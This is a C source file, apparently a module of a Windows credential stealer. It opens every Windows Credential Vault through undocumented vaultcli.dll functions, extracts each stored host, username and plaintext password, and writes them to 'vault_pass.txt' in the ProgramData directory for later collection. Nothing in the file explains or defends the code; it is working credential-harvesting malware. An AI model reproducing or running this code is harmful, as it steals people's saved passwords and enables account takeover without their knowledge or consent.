#include "main.h"

HMODULE vaultcli_addr;
typedef HANDLE HVAULT;
#define VAULT_ENUMERATE_ALL_ITEMS 512

enum VAULT_SCHEMA_ELEMENT_ID {
	ElementId_Illegal = 0,
	ElementId_Resource = 1,
	ElementId_Identity = 2,
	ElementId_Authenticator = 3,
	ElementId_Tag = 4,
	ElementId_PackageSid = 5,
	ElementId_AppStart = 0x64,
	ElementId_AppEnd = 0x2710
};

enum VAULT_ELEMENT_TYPE {
	ElementType_Boolean = 0,
	ElementType_Short = 1,
	ElementType_UnsignedShort = 2,
	ElementType_Integer = 3,
	ElementType_UnsignedInteger = 4,
	ElementType_Double = 5,
	ElementType_Guid = 6,
	ElementType_String = 7,
	ElementType_ByteArray = 8,
	ElementType_TimeStamp = 9,
	ElementType_ProtectedArray = 0xA,
	ElementType_Attribute = 0xB,
	ElementType_Sid = 0xC,
	ElementType_Last = 0xD,
	ElementType_Undefined = 0xFFFFFFFF
};

typedef struct _VAULT_BYTE_BUFFER {
	DWORD Length;
	PBYTE Value;
} VAULT_BYTE_BUFFER, * PVAULT_BYTE_BUFFER;

typedef struct _VAULT_ITEM_DATA {
	DWORD SchemaElementId;
	DWORD unk0;
	enum VAULT_ELEMENT_TYPE Type;
	DWORD unk1;
	union {
		BOOL Boolean;
		SHORT Short;
		WORD UnsignedShort;
		LONG Int;
		ULONG UnsignedInt;
		DOUBLE Double;
		GUID Guid;
		LPWSTR String;
		VAULT_BYTE_BUFFER ByteArray;
		VAULT_BYTE_BUFFER ProtectedArray;
		DWORD Attribute;
		DWORD Sid;
	} data;
} VAULT_ITEM_DATA, * PVAULT_ITEM_DATA;

typedef struct _VAULT_ITEM_8 {
	GUID SchemaId;
	PWSTR FriendlyName;
	PVAULT_ITEM_DATA Resource;
	PVAULT_ITEM_DATA Identity;
	PVAULT_ITEM_DATA Authenticator;
	PVAULT_ITEM_DATA PackageSid;
	FILETIME LastWritten;
	DWORD Flags;
	DWORD cbProperties;
	PVAULT_ITEM_DATA Properties;
} VAULT_ITEM, * PVAULT_ITEM;

typedef DWORD(WINAPI* VaultEnumerateVaults)(DWORD flags, PDWORD count, GUID** guids);
typedef DWORD(WINAPI* VaultEnumerateItems)(HVAULT handle, DWORD flags, PDWORD count, PVOID* items);
typedef DWORD(WINAPI* VaultOpenVault)(GUID* id, DWORD flags, HVAULT* handle);
typedef DWORD(WINAPI* VaultCloseVault)(HVAULT handle);
typedef DWORD(WINAPI* VaultFree)(PVOID mem);
typedef DWORD(WINAPI* PVAULTGETITEM) (HANDLE vault, LPGUID SchemaId, PVAULT_ITEM_DATA Resource, PVAULT_ITEM_DATA Identity, PVAULT_ITEM_DATA PackageSid, HWND hWnd, DWORD Flags, PVAULT_ITEM* pItem);

VaultEnumerateItems  pVaultEnumerateItems;
VaultFree            pVaultFree;
VaultOpenVault       pVaultOpenVault;
VaultCloseVault      pVaultCloseVault;
VaultEnumerateVaults pVaultEnumerateVaults;
PVAULTGETITEM       pVaultGetItem;

int load_vaultcli_lib() {
	
	vaultcli_addr = LoadLibraryA("vaultcli.dll");
	if (!vaultcli_addr) {
		return 0;
	}

	pVaultEnumerateItems = (VaultEnumerateItems)GetProcAddress(vaultcli_addr, "VaultEnumerateItems");
	pVaultEnumerateVaults = (VaultEnumerateVaults)GetProcAddress(vaultcli_addr, "VaultEnumerateVaults");
	pVaultFree = (VaultFree)GetProcAddress(vaultcli_addr, "VaultFree");
	pVaultOpenVault = (VaultOpenVault)GetProcAddress(vaultcli_addr, "VaultOpenVault");
	pVaultCloseVault = (VaultCloseVault)GetProcAddress(vaultcli_addr, "VaultCloseVault");
	pVaultGetItem = (PVAULTGETITEM)GetProcAddress(vaultcli_addr, "VaultGetItem");

	return 1;
}

int get_vault_creds() {
	DWORD vaults_counter, items_counter, bytes_written;
	LPGUID vaults;
	HVAULT hVault;
	PVOID items;
	PVAULT_ITEM vault_items, pVaultItems;
	char* out = NULL, *pout;
	HANDLE file_to_write;

	if (!load_vaultcli_lib()) {
		return 0;
	}

	if (pVaultEnumerateVaults(NULL, &vaults_counter, &vaults) != ERROR_SUCCESS) return 0;

	for (int i = 0; i < vaults_counter; i++) {
		if (pVaultOpenVault(&vaults[i], 0, &hVault) == ERROR_SUCCESS) {
			if (pVaultEnumerateItems(hVault, VAULT_ENUMERATE_ALL_ITEMS, &items_counter, &items) == ERROR_SUCCESS) {
				
				vault_items = (PVAULT_ITEM)items;
				out = (char*)my_heapalloc(1024 * 64); //64KB
				if (!out) {
					pVaultFree(items);
					pVaultCloseVault(&hVault);
					pVaultFree(vaults);
					return 0;
				}

				pout = out;
				for (int j = 0; j < items_counter; j++) {
					wchar_t* username = NULL, * password = NULL, * hostname = NULL;
					
					pVaultItems = NULL;
					hostname = vault_items[j].Resource->data.String;
					username = vault_items[j].Identity->data.String;
					if (pVaultGetItem(hVault, &vault_items[j].SchemaId, vault_items[j].Resource, vault_items[j].Identity, vault_items[j].PackageSid, NULL, 0, &pVaultItems) == 0) {
						if (pVaultItems->Authenticator != NULL && pVaultItems->Authenticator->data.String != NULL) {
							password = pVaultItems->Authenticator->data.String;
							if (wcslen(password) > 100) password = NULL;
						}
					}

					my_sprintf(pout, "host: %w\r\nuser: %w\r\npass: %w\r\n\r\n", hostname, username, password);
					pout += my_strlen(pout);
					if (pVaultItems) pVaultFree(pVaultItems);
				}

				pVaultFree(items);
				char path[260];
				my_sprintf(path, "%s\\%s", programdata_path, "vault_pass.txt");
				file_to_write = CreateFileA(path, FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
				if (file_to_write) {
					WriteFile(file_to_write, out, pout - out, &bytes_written, NULL);
					CloseHandle(file_to_write);
				}
			}
			pVaultCloseVault(&hVault);
		}
	}

	if (vaults) {
		pVaultFree(vaults);
		vaults = NULL;
	}
	return 1;
}